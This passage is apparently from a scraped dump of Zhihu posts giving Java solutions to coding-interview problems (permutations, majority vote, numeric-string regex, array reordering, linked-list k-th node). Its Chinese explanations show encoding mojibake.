class=\"n\">String</span><span class=\"o\">&gt;</span> <span class=\"nf\">Permutation</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n    <span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">chars</span> <span class=\"o\">=</span> <span class=\"n\">str</span><span class=\"o\">.</span><span class=\"na\">toCharArray</span><span class=\"o\">();</span>\n    <span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">sort</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">);</span>\n    <span class=\"n\">backtracking</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"k\">new</span> <span class=\"kt\">boolean</span><span class=\"o\">[</span><span class=\"n\">chars</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">],</span> <span class=\"k\">new</span> <span class=\"n\">StringBuilder</span><span class=\"o\">());</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">backtracking</span><span class=\"o\">(</span><span class=\"kt\">char</span><span class=\"o\">[]</span> <span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"kt\">boolean</span><span class=\"o\">[]</span> <span class=\"n\">hasUsed</span><span class=\"o\">,</span> <span class=\"n\">StringBuilder</span> <span class=\"n\">s</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">chars</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">());</span>\n        <span class=\"k\">return</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">chars</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">hasUsed</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">])</span>\n            <span class=\"k\">continue</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">!=</span> <span class=\"n\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">chars</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">chars</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">hasUsed</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">])</span> <span class=\"cm\">/* ä¿è¯ä¸é‡å¤ */</span>\n            <span class=\"k\">continue</span><span class=\"o\">;</span>\n        <span class=\"n\">hasUsed</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n        <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">append</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]);</span>\n        <span class=\"n\">backtracking</span><span class=\"o\">(</span><span class=\"n\">chars</span><span class=\"o\">,</span> <span class=\"n\">hasUsed</span><span class=\"o\">,</span> <span class=\"n\">s</span><span class=\"o\">);</span>\n        <span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">deleteCharAt</span><span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n        <span class=\"n\">hasUsed</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>39. æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/e8a1b01a2df14cb2b228b30ee6a92163%3FtpId%3D13%26tqId%3D11181%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>è§£é¢˜æ€è·¯</h2><p>å¤šæ•°æŠ•ç¥¨é—®é¢˜ï¼Œå¯ä»¥åˆ©ç”¨ Boyer-Moore Majority Vote Algorithm æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½¿å¾—æ—¶é—´å¤æ‚åº¦ä¸º O(N)ã€‚</p><p>ä½¿ç”¨ cnt æ¥ç»Ÿè®¡ä¸€ä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œå½“éå†åˆ°çš„å…ƒç´ å’Œç»Ÿè®¡å…ƒç´ ç›¸ç­‰æ—¶ï¼Œä»¤ cnt++ï¼Œå¦åˆ™ä»¤ cnt--ã€‚å¦‚æœå‰é¢æŸ¥æ‰¾äº† i ä¸ªå…ƒç´ ï¼Œä¸” cnt == 0ï¼Œè¯´æ˜å‰ i ä¸ªå…ƒç´ æ²¡æœ‰ majorityï¼Œæˆ–è€…æœ‰ majorityï¼Œä½†æ˜¯å‡ºç°çš„æ¬¡æ•°å°‘äº i / 2 ï¼Œå› ä¸ºå¦‚æœå¤šäº i / 2 çš„è¯ cnt å°±ä¸€å®šä¸ä¼šä¸º 0 ã€‚æ­¤æ—¶å‰©ä¸‹çš„ n - i ä¸ªå…ƒç´ ä¸­ï¼Œmajority çš„æ•°ç›®ä¾ç„¶å¤šäº (n - i) / 2ï¼Œå› æ­¤ç»§ç»­æŸ¥æ‰¾å°±èƒ½æ‰¾å‡º majorityã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">MoreThanHalfNum_Solution</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">majority</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">];</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"n\">majority</span> <span class=\"o\">?</span> <span class=\"n\">cnt</span> <span class=\"o\">+</span> <span class=\"n\">1</span> <span class=\"o\">:</span> <span class=\"n\">cnt</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">cnt</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">majority</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n            <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">val</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">val</span> <span class=\"o\">==</span> <span class=\"n\">majority</span><span class=\"o\">)</span>\n            <span class=\"n\">cnt</span><span class=\"o\">++;</span>\n    <span class=\"k\">return</span> <span class=\"n\">cnt</span> <span class=\"o\">&gt;</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">/</span> <span class=\"n\">2</span> <span class=\"o\">?</span> <span class=\"n\">majority</span> <span class=\"o\">:</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>ä½ å¯ä»¥åœ¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·åå°ä¸æˆ‘äº¤æµã€‚å¦å¤–ï¼Œå…¬ä¼—å·ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚å…¬ä¼—å·ä¹Ÿæä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "ç®—æ³•", 
                    "tagLink": "https://api.zhihu.com/topics/19553510"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68764926", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "å‰‘æŒ‡ Offer é¢˜è§£ 20-29", 
            "content": "<ul><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#20-%E8%A1%A8%E7%A4%BA%E6%95%B0%E5%80%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2\" class=\"internal\">20. è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#21-%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2\" class=\"internal\">21. è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#22-%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%AC-k-%E4%B8%AA%E7%BB%93%E7%82%B9\" class=\"internal\">22. é“¾è¡¨ä¸­å€’æ•°ç¬¬ K ä¸ªç»“ç‚¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#23-%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E7%BB%93%E7%82%B9\" class=\"internal\">23. é“¾è¡¨ä¸­ç¯çš„å…¥å£ç»“ç‚¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#24-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8\" class=\"internal\">24. åè½¬é“¾è¡¨</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#25-%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E7%9A%84%E9%93%BE%E8%A1%A8\" class=\"internal\">25. åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#26-%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84\" class=\"internal\">26. æ ‘çš„å­ç»“æ„</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#27-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"internal\">27. äºŒå‰æ ‘çš„é•œåƒ</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#28-%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91\" class=\"internal\">28 å¯¹ç§°çš„äºŒå‰æ ‘</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926/edit#29-%E9%A1%BA%E6%97%B6%E9%92%88%E6%89%93%E5%8D%B0%E7%9F%A9%E9%98%B5\" class=\"internal\">29. é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µ</a> </li></ul><h2>20. è¡¨ç¤ºæ•°å€¼çš„å­—ç¬¦ä¸²</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/6f8c901d091949a5837e24bb82a731f2%3FtpId%3D13%26tqId%3D11206%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><div class=\"highlight\"><pre><code class=\"language-text\">true\n\n&#34;+100&#34;\n&#34;5e2&#34;\n&#34;-123&#34;\n&#34;3.1416&#34;\n&#34;-1E-16&#34;\nfalse\n\n&#34;12e&#34;\n&#34;1a3.14&#34;\n&#34;1.2.3&#34;\n&#34;+-5&#34;\n&#34;12e+4.3&#34;</code></pre></div><h2>è§£é¢˜æ€è·¯</h2><p>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">[]  ï¼š å­—ç¬¦é›†åˆ\n()  ï¼š åˆ†ç»„\n?   ï¼š é‡å¤ 0 ~ 1 æ¬¡\n+   ï¼š é‡å¤ 1 ~ n æ¬¡\n*   ï¼š é‡å¤ 0 ~ n æ¬¡\n.   ï¼š ä»»æ„å­—ç¬¦\n\\\\. ï¼š è½¬ä¹‰åçš„ .\n\\\\d ï¼š æ•°å­—\npublic boolean isNumeric(char[] str) {\n    if (str == null || str.length == 0)\n        return false;\n    return new String(str).matches(&#34;[+-]?\\\\d*(\\\\.\\\\d+)?([eE][+-]?\\\\d+)?&#34;);\n}</code></pre></div><h2>21. è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/beb5aa231adc45b2a5dcc5b62c93f593%3FtpId%3D13%26tqId%3D11166%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>éœ€è¦ä¿è¯å¥‡æ•°å’Œå¥‡æ•°ï¼Œå¶æ•°å’Œå¶æ•°ä¹‹é—´çš„ç›¸å¯¹ä½ç½®ä¸å˜ï¼Œè¿™å’Œä¹¦æœ¬ä¸å¤ªä¸€æ ·ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-d2365af564dd8f9d72b0ffb4de99b27f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"269\" data-rawheight=\"277\" class=\"content_image\" width=\"269\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;269&#39; height=&#39;277&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"269\" data-rawheight=\"277\" class=\"content_image lazy\" width=\"269\" data-actualsrc=\"https://pic4.zhimg.com/v2-d2365af564dd8f9d72b0ffb4de99b27f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>æ–¹æ³•ä¸€ï¼šåˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œæ—¶é—´å¤æ‚åº¦ O(N)ï¼Œç©ºé—´å¤æ‚åº¦ O(N)ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">reOrderArray</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// å¥‡æ•°ä¸ªæ•°\n</span><span class=\"c1\"></span>    <span class=\"kt\">int</span> <span class=\"n\">oddCnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span>\n        <span class=\"k\">if</span> <span class=\"o\">(!</span><span class=\"n\">isEven</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">))</span>\n            <span class=\"n\">oddCnt</span><span class=\"o\">++;</span>\n    <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">copy</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n    <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">oddCnt</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">num</span> <span class=\"o\">:</span> <span class=\"n\">copy</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">num</span> <span class=\"o\">%</span> <span class=\"n\">2</span> <span class=\"o\">==</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n            <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">++]</span> <span class=\"o\">=</span> <span class=\"n\">num</span><span class=\"o\">;</span>\n        <span class=\"k\">else</span>\n            <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">++]</span> <span class=\"o\">=</span> <span class=\"n\">num</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">boolean</span> <span class=\"nf\">isEven</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">x</span> <span class=\"o\">%</span> <span class=\"n\">2</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>æ–¹æ³•äºŒï¼šä½¿ç”¨å†’æ³¡æ€æƒ³ï¼Œæ¯æ¬¡éƒ½å½“å‰å¶æ•°ä¸Šæµ®åˆ°å½“å‰æœ€å³è¾¹ã€‚æ—¶é—´å¤æ‚åº¦ O(N2)ï¼Œç©ºé—´å¤æ‚åº¦ O(1)ï¼Œæ—¶é—´æ¢ç©ºé—´ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">reOrderArray</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">N</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">N</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&gt;</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">--)</span> <span class=\"o\">{</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">i</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">isEven</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">])</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">isEven</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">]))</span> <span class=\"o\">{</span>\n                <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">j</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n            <span class=\"o\">}</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">boolean</span> <span class=\"nf\">isEven</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">x</span> <span class=\"o\">%</span> <span class=\"n\">2</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">swap</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n    <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n    <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>22. é“¾è¡¨ä¸­å€’æ•°ç¬¬ K ä¸ªç»“ç‚¹</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/529d3ae5a407492994ad2a246518148a%3FtpId%3D13%26tqId%3D11167%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>è§£é¢˜æ€è·¯</h2><p>è®¾é“¾è¡¨çš„é•¿åº¦ä¸º Nã€‚è®¾ç½®ä¸¤ä¸ªæŒ‡é’ˆ P1 å’Œ P2ï¼Œå…ˆè®© P1 ç§»åŠ¨ K ä¸ªèŠ‚ç‚¹ï¼Œåˆ™è¿˜æœ‰ N - K ä¸ªèŠ‚ç‚¹å¯ä»¥ç§»åŠ¨ã€‚æ­¤æ—¶è®© P1 å’Œ P2 åŒæ—¶ç§»åŠ¨ï¼Œå¯ä»¥çŸ¥é“å½“ P1 ç§»åŠ¨åˆ°é“¾è¡¨ç»“å°¾æ—¶ï¼ŒP2 ç§»åŠ¨åˆ°ç¬¬ N - K ä¸ªèŠ‚ç‚¹å¤„ï¼Œè¯¥ä½ç½®å°±æ˜¯å€’æ•°ç¬¬ K ä¸ªèŠ‚ç‚¹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-e0b5753ba289e93b8b10d285d0666f53_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"737\" data-rawheight=\"380\" class=\"origin_image zh-lightbox-thumb\" width=\"737\" data-original=\"https://pic4.zhimg.com/v2-e0b5753ba289e93b8b10d285d0666f53_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;737&#39; height=&#39;380&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"737\" data-rawheight=\"380\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"737\" data-original=\"https://pic4.zhimg.com/v2-e0b5753ba289e93b8b10d285d0666f53_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-e0b5753ba289e93b8b10d285d0666f53_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ListNode</span> <span class=\"nf\">FindKthToTail</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">head</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">head</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"n\">ListNode</span> <span class=\"n\">P1</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n    <span 